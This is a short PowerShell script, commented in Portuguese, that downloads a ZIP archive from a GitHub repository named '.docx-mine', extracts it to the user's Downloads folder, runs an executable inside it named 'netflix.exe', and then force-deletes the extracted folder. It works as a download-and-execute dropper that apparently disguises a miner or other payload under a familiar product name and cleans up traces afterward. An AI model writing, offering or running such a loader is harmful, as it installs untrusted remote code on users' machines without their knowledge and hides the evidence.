# Define a URL do arquivo ZIP
$url = "https://github.com/pedrosones123/.docx-mine/archive/refs/heads/main.zip"

# Define o caminho para a pasta de destino (Downloads)
$destination = "$env:USERPROFILE\Downloads"

# Caminho completo do arquivo ZIP baixado
$zipFile = Join-Path -Path $destination -ChildPath "main.zip"

# Caminho do diretório descompactado
$extractedFolder = Join-Path -Path $destination -ChildPath ".docx-mine-main"

# Baixa o arquivo ZIP
Invoke-WebRequest -Uri $url -OutFile $zipFile

# Descompacta o arquivo ZIP para a pasta de destino
Expand-Archive -Path $zipFile -DestinationPath $destination

# Executa o arquivo netflix.exe após a extração
$netflixFile = Join-Path -Path $extractedFolder -ChildPath "netflix.exe"
Start-Process -FilePath $netflixFile -Wait  # Espera a execução do netflix.exe terminar

# Remove o diretório descompactado após a execução do netflix.exe
Remove-Item -Path $extractedFolder -Recurse -Force
